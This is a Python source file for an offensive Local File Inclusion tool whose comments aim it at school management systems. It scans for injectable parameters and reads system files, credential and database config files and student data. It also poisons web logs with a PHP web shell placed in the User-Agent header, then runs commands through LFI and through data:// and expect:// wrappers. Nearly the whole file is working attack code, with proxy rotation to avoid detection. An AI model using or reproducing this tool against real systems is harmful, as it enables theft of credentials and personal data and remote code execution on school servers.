#!/usr/bin/env python3
# exploit/lfi_scanner.py - Local File Inclusion Scanner
import requests
import re
import os
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup

class LFIScanner:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        self.lfi_payloads = self.load_lfi_payloads()
        
    def load_lfi_payloads(self):
        """Load LFI payloads"""
        # Common LFI payloads for school systems
        payloads = [
            # Basic LFI
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/hosts",
            "../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../windows/system.ini",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=",
            "data://text/plain;base64,",
            
            # School-specific files
            "../../../config/database.php",
            "../../../application/config/database.php",
            "../../../wp-config.php",
            "../../../configuration.php",
            
            # Log files
            "../../../logs/error.log",
            "../../../var/log/apache2/access.log",
            "../../../var/log/httpd/access_log",
            
            # Session files
            "../../../tmp/sess_",
            "../../../var/lib/php/sessions/sess_",
            
            # School management files
            "../../../data/siswa.csv",
            "../../../backup/database.sql",
            "../../../uploads/",
            
            # Directory traversal
            "....//....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            
            # Encoded payloads
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Null byte injection
            "../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../etc/passwd\0",
        ]
        
        return payloads
    
    def find_lfi_parameters(self, url):
        """Find parameters potentially vulnerable to LFI"""
        vulnerable_params = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all URLs with parameters
            urls = set()
            
            # From links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if '?' in href:
                    urls.add(urljoin(url, href))
            
            # From forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action and '?' in action:
                    urls.add(urljoin(url, action))
            
            # From scripts (AJAX calls)
            script_pattern = r'["\'](/[^"\']*\?[^"\']*)["\']'
            matches = re.findall(script_pattern, response.text)
            for match in matches:
                urls.add(urljoin(url, match))
            
            # Extract parameters from URLs
            for found_url in urls:
                parsed = urlparse(found_url)
                query = parsed.query
                
                if query:
                    # Common LFI parameter names
                    lfi_param_patterns = [
                        'file', 'page', 'load', 'include',
                        'path', 'dir', 'document', 'template',
                        'view', 'content', 'module', 'theme',
                        'download', 'show', 'read', 'get',
                        'doc', 'pdf', 'img', 'image'
                    ]
                    
                    params = re.findall(r'([^=&]+)=', query)
                    for param in params:
                        param_lower = param.lower()
                        if any(pattern in param_lower for pattern in lfi_param_patterns):
                            vulnerable_params.append({
                                'url': found_url,
                                'parameter': param,
                                'full_url': found_url
                            })
            
            return vulnerable_params[:10]  # Limit to 10
            
        except Exception as e:
            print(f"Error finding LFI parameters: {e}")
            return []
    
    def test_lfi(self, url, parameter=None):
        """Test for Local File Inclusion vulnerability"""
        results = []
        
        if not parameter:
            # Find parameters automatically
            params = self.find_lfi_parameters(url)
            if not params:
                print("[!] No LFI parameters found")
                return results
            
            print(f"[+] Found {len(params)} potential LFI parameters")
            
            for param_info in params:
                test_url = param_info['url']
                test_param = param_info['parameter']
                
                print(f"\n[→] Testing: {test_param} on {test_url}")
                
                param_results = self.test_parameter_lfi(test_url, test_param)
                results.extend(param_results)
        else:
            # Test specific parameter
            print(f"[+] Testing parameter: {parameter} on {url}")
            results = self.test_parameter_lfi(url, parameter)
        
        return results
    
    def test_parameter_lfi(self, url, parameter):
        """Test a specific parameter for LFI"""
        results = []
        
        # Get base URL without parameters
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Get existing parameters
        existing_params = {}
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    existing_params[key] = value
        
        # Test each payload
        for payload in self.lfi_payloads[:15]:  # Test first 15 payloads
            # Create test parameters
            test_params = existing_params.copy()
            test_params[parameter] = payload
            
            # Build URL with encoded parameter
            query_string = '&'.join([f"{k}={quote(v)}" for k, v in test_params.items()])
            test_url = f"{base_url}?{query_string}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for LFI indicators
                is_vulnerable, evidence = self.check_lfi_response(response, payload)
                
                if is_vulnerable:
                    result = {
                        'url': test_url,
                        'parameter': parameter,
                        'payload': payload,
                        'status_code': response.status_code,
                        'vulnerable': True,
                        'evidence': evidence,
                        'response_preview': response.text[:200]
                    }
                    results.append(result)
                    
                    print(f"  [✓] LFI Found: {payload[:50]}...")
                    
                    # Try to read actual file content
                    if self.is_file_read_payload(payload):
                        file_content = self.extract_file_content(response.text)
                        if file_content:
                            result['file_content'] = file_content[:500]  # Limit
                    
                    break  # Stop testing if found vulnerable
                else:
                    print(f"  [✗] {payload[:50]}...")
            
            except Exception as e:
                print(f"  [!] Error: {e}")
        
        return results
    
    def check_lfi_response(self, response, payload):
        """Check if response indicates LFI vulnerability"""
        content = response.text
        
        # Check for file content indicators
        file_indicators = {
            'etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:', 'nobody:'],
            'etc/hosts': ['127.0.0.1', 'localhost', '::1'],
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
            'system.ini': ['[boot]', '[386Enh]', '[drivers]'],
            'database.php': ['DB_HOST', 'DB_NAME', 'DB_USER', 'DB_PASSWORD'],
            'wp-config.php': ['define(', 'WP_', 'DB_'],
            'config': ['hostname', 'username', 'password', 'database'],
            'log file': ['GET ', 'POST ', 'HTTP/', '404', '500'],
            'session': ['PHPSESSID', 'session.', 'cookie'],
            'base64': ['PD9', 'PCFET', 'PGh0bWw', 'PHNjcmlwd']  # Common base64 starts
        }
        
        # Check for specific file indicators
        for file_type, indicators in file_indicators.items():
            if file_type in payload.lower():
                for indicator in indicators:
                    if indicator in content:
                        return True, f"Found {indicator} in response"
        
        # Check for common error messages that indicate LFI
        error_messages = [
            'failed to open stream',
            'no such file or directory',
            'file not found',
            'warning: include',
            'warning: require',
            'failed opening',
            'permission denied',
            'open_basedir restriction'
        ]
        
        for error in error_messages:
            if error.lower() in content.lower():
                return True, f"Error message: {error}"
        
        # Check for directory traversal success
        if response.status_code == 200 and len(content) > 100:
            # Look for system file patterns
            if re.search(r'/\w+:\w+:\d+:\d+:', content):  # /etc/passwd format
                return True, "Found /etc/passwd format"
            
            if '<?php' in content and payload.endswith('.php'):
                return True, "PHP file inclusion successful"
        
        return False, "No LFI indicators found"
    
    def is_file_read_payload(self, payload):
        """Check if payload is for reading files"""
        file_read_indicators = [
            'etc/passwd', 'etc/hosts', 'win.ini',
            'system.ini', '.php', '.log', '.sql',
            '.csv', '.txt', '.ini', '.conf'
        ]
        
        return any(indicator in payload.lower() for indicator in file_read_indicators)
    
    def extract_file_content(self, response_text):
        """Extract file content from response"""
        # Try to find file content between HTML tags or in plain text
        lines = response_text.split('\n')
        
        # Look for lines that look like file content (not HTML)
        file_lines = []
        for line in lines:
            line_stripped = line.strip()
            if line_stripped and not line_stripped.startswith('<'):
                # Check if line looks like file content
                if len(line_stripped) > 10 and not re.search(r'<[^>]+>', line_stripped):
                    file_lines.append(line_stripped)
        
        return '\n'.join(file_lines[:20])  # Return first 20 lines
    
    def read_local_files(self, url, param, file_paths=None):
        """Read local files via LFI vulnerability"""
        if not file_paths:
            # Default school system files to read
            file_paths = [
                '/etc/passwd',
                '/etc/hosts',
                '/proc/version',
                '/proc/self/environ',
                '../../../config/database.php',
                '../../../wp-config.php',
                '../../../application/config/database.php',
                '/var/log/apache2/access.log',
                '/var/log/auth.log',
                '/var/www/html/index.php'
            ]
        
        results = []
        
        for file_path in file_paths:
            print(f"[→] Reading: {file_path}")
            
            # Encode file path
            encoded_path = file_path
            
            # Build URL with file path
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Get existing parameters
            existing_params = {}
            if parsed.query:
                for pair in parsed.query.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        existing_params[key] = value
            
            # Set file path parameter
            test_params = existing_params.copy()
            test_params[param] = encoded_path
            
            # Build URL
            query_string = '&'.join([f"{k}={quote(v)}" for k, v in test_params.items()])
            test_url = f"{base_url}?{query_string}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                result = {
                    'file_path': file_path,
                    'url': test_url,
                    'status_code': response.status_code,
                    'success': False,
                    'content': None,
                    'error': None
                }
                
                if response.status_code == 200:
                    # Check if file was actually read
                    content = response.text
                    
                    # Verify it's the file and not error page
                    verification = self.verify_file_content(file_path, content)
                    
                    if verification['is_file']:
                        result['success'] = True
                        result['content'] = content[:1000]  # Limit content
                        result['verification'] = verification['evidence']
                        print(f"  [✓] Successfully read ({len(content)} bytes)")
                    else:
                        result['error'] = "File not found or access denied"
                        print(f"  [✗] File not found")
                else:
                    result['error'] = f"HTTP {response.status_code}"
                    print(f"  [✗] HTTP {response.status_code}")
                
                results.append(result)
                
            except Exception as e:
                error_result = {
                    'file_path': file_path,
                    'error': str(e),
                    'success': False
                }
                results.append(error_result)
                print(f"  [!] Error: {e}")
        
        return results
    
    def verify_file_content(self, file_path, content):
        """Verify that content is actually from the requested file"""
        verification = {
            'is_file': False,
            'evidence': None
        }
        
        content_lower = content.lower()
        
        # Check based on file type
        if 'passwd' in file_path:
            if 'root:' in content and 'daemon:' in content:
                verification['is_file'] = True
                verification['evidence'] = '/etc/passwd format detected'
        
        elif 'hosts' in file_path:
            if '127.0.0.1' in content and 'localhost' in content:
                verification['is_file'] = True
                verification['evidence'] = '/etc/hosts format detected'
        
        elif 'database.php' in file_path or 'config' in file_path:
            if ('db_host' in content_lower or 'db_name' in content_lower or 
                'define(' in content or 'password' in content_lower):
                verification['is_file'] = True
                verification['evidence'] = 'Database configuration detected'
        
        elif '.log' in file_path:
            if ('GET ' in content or 'POST ' in content or 
                'HTTP/' in content or ' 404 ' in content or ' 500 ' in content):
                verification['is_file'] = True
                verification['evidence'] = 'Log file format detected'
        
        elif '.php' in file_path:
            if '<?php' in content or 'function ' in content or 'class ' in content:
                verification['is_file'] = True
                verification['evidence'] = 'PHP file detected'
        
        else:
            # Generic check - if content looks like a file (not HTML page)
            html_indicators = ['<html', '<body', '<head', '<div', '<script']
            is_html = any(indicator in content_lower for indicator in html_indicators)
            
            if not is_html and len(content) > 50:
                verification['is_file'] = True
                verification['evidence'] = 'Non-HTML content, likely file data'
        
        return verification
    
    def log_poisoning(self, url, param):
        """Attempt log poisoning via LFI"""
        print(f"[+] Attempting log poisoning on {url}")
        
        results = []
        
        # Common log locations
        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/httpd/access_log',
            '/var/log/nginx/access.log',
            '/var/www/logs/access.log',
            '../../../logs/access.log',
            '/proc/self/fd/2',  # stderr
        ]
        
        # Test each log file
        for log_file in log_files:
            print(f"\n[→] Testing log file: {log_file}")
            
            # First, verify log file is readable
            log_content = self.read_local_files(url, param, [log_file])
            
            if log_content and log_content[0]['success']:
                print(f"  [✓] Log file is readable")
                
                # Attempt to poison log
                poisoning_result = self.attempt_log_poisoning(url, param, log_file)
                results.append({
                    'log_file': log_file,
                    'readable': True,
                    'poisoning': poisoning_result
                })
                
                if poisoning_result['success']:
                    print(f"  [✓] Log poisoning successful!")
                else:
                    print(f"  [✗] Log poisoning failed")
            else:
                print(f"  [✗] Log file not readable")
                results.append({
                    'log_file': log_file,
                    'readable': False,
                    'poisoning': {'success': False}
                })
        
        return results
    
    def attempt_log_poisoning(self, url, param, log_file):
        """Attempt to poison log file with PHP code"""
        result = {
            'success': False,
            'method': None,
            'evidence': None
        }
        
        # PHP code to inject
        php_code = "<?php system($_GET['cmd']); ?>"
        
        # Method 1: Inject via User-Agent
        headers = {
            'User-Agent': php_code
        }
        
        try:
            # Make request with malicious User-Agent
            response = self.session.get(url, headers=headers, timeout=10)
            
            # Now try to execute via LFI
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Build LFI URL with command execution
            lfi_url = f"{base_url}?{param}={log_file}&cmd=id"
            
            cmd_response = self.session.get(lfi_url, timeout=10)
            
            # Check for command execution
            if 'uid=' in cmd_response.text and 'gid=' in cmd_response.text:
                result['success'] = True
                result['method'] = 'User-Agent injection'
                result['evidence'] = 'Command execution successful'
            
        except Exception as e:
            result['evidence'] = f"Error: {e}"
        
        return result
    
    def php_wrapper_attack(self, url, param):
        """Test PHP wrapper attacks"""
        print(f"[+] Testing PHP wrapper attacks on {url}")
        
        wrappers = [
            # PHP filters
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'php://filter/string.rot13/resource=index.php',
            'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
            
            # Data wrapper
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',  # <?php system($_GET['cmd']);?>
            'data://text/plain,<?php system("id"); ?>',
            
            # Expect wrapper (if enabled)
            'expect://id',
            'expect://ls',
            
            # Input wrapper
            'php://input',
            
            # ZIP wrapper
            'zip:///path/to/file.zip#file.txt',
        ]
        
        results = []
        
        for wrapper in wrappers[:8]:  # Test first 8
            print(f"\n[→] Testing: {wrapper[:50]}...")
            
            # Build URL with wrapper
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Get existing parameters
            existing_params = {}
            if parsed.query:
                for pair in parsed.query.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        existing_params[key] = value
            
            # Set wrapper parameter
            test_params = existing_params.copy()
            test_params[param] = wrapper
            
            # Build URL
            query_string = '&'.join([f"{k}={quote(v)}" for k, v in test_params.items()])
            test_url = f"{base_url}?{query_string}"
            
            try:
                # For php://input, need POST request
                if 'php://input' in wrapper:
                    response = self.session.post(test_url, data='<?php echo "test"; ?>', timeout=10)
                else:
                    response = self.session.get(test_url, timeout=10)
                
                result = {
                    'wrapper': wrapper,
                    'url': test_url,
                    'status_code': response.status_code,
                    'success': False,
                    'response_preview': response.text[:200]
                }
                
                # Check for success indicators
                if response.status_code == 200:
                    if 'base64' in wrapper and 'PD9' in response.text:
                        result['success'] = True
                        result['evidence'] = 'Base64 encoded content found'
                        print(f"  [✓] PHP filter successful")
                    
                    elif 'data://' in wrapper and ('uid=' in response.text or 'test' in response.text):
                        result['success'] = True
                        result['evidence'] = 'Data wrapper execution successful'
                        print(f"  [✓] Data wrapper execution")
                    
                    elif 'expect://' in wrapper and response.text:
                        result['success'] = True
                        result['evidence'] = 'Expect wrapper might be enabled'
                        print(f"  [✓] Expect wrapper might work")
                    
                    else:
                        print(f"  [✗] No execution")
                else:
                    print(f"  [✗] HTTP {response.status_code}")
                
                results.append(result)
                
            except Exception as e:
                print(f"  [!] Error: {e}")
                results.append({
                    'wrapper': wrapper,
                    'error': str(e),
                    'success': False
                })
        
        return results

# Example usage
if __name__ == "__main__":
    scanner = LFIScanner()
    url = "http://vulnerable-site.com/page.php"
    
    # Find and test LFI parameters
    results = scanner.test_lfi(url)
    print(f"\nFound {len([r for r in results if r['vulnerable']])} LFI vulnerabilities")
    
    # If vulnerable, read files
    if results:
        vuln_result = results[0]
        files = scanner.read_local_files(
            vuln_result['url'], 
            vuln_result['parameter'],
            ['/etc/passwd', '/etc/hosts']
        )
        print(f"\nRead {len([f for f in files if f['success']])} files")
